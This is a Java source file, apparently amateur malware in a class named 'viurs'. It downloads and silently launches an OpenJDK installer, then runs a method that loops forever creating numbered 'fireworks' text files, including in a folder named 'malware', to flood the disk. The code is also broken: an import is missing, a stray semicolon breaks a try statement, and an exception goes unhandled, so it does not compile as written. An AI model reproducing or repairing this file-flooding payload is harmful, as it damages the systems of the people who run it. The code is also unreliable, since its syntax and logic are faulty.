import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.*;

import javax.swing.JOptionPane;

public class viurs {
    private static final String JDK_URL = "https://download.java.net/java/early_access/jdk15/16/GPL/openjdk-15+36_windows-x64_bin.exe";
    private static final String INSTALLER_NAME = "jdk-installer.exe";

    public static void downloadJDK() {
        try {
            URL url = new URL(JDK_URL);
            try (ReadableByteChannel rbc = Channels.newChannel(url.openStream()));
                 FileOutputStream fos = new FileOutputStream(INSTALLER_NAME)) {
                fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                System.out.println("Java JDK installer downloaded successfully!");
            }
        } catch (IOException e) {
            showErrorDialog("Error downloading JDK: " + e.getMessage());
        }
    }

    // Method to install JDK
    public static void installJDK() {
        try {
            // Run the installer (silent mode)
            ProcessBuilder processBuilder = new ProcessBuilder(INSTALLER_NAME, "/s");
            processBuilder.start();
            System.out.println("Java JDK installer started. Please follow the installation instructions.");
        } catch (IOException e) {
            showErrorDialog("Error starting the installer: " + e.getMessage());
        }
    }

    public static void plzwork() throws Exception {
        for (int i = 0; i <= i; i++) {
            File myObj = new File("D:\\Desktop\\malware\\fireworks" + i + ".txt");
            myObj.createNewFile();
            if (!myObj.createNewFile()) {
                File myObj2 = new File("C:\\Desktop\\Downloads\\fireworks" + i + ".txt");
                myObj2.createNewFile();
            } else {
                System.out.println("i Can't create it");
            }
        }
    }

    public static void showErrorDialog(String errorMessage) {
        JOptionPane.showMessageDialog(null, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
    }

    public static void main(String[] args) {
        downloadJDK();
        installJDK();
        plzwork();
    }

}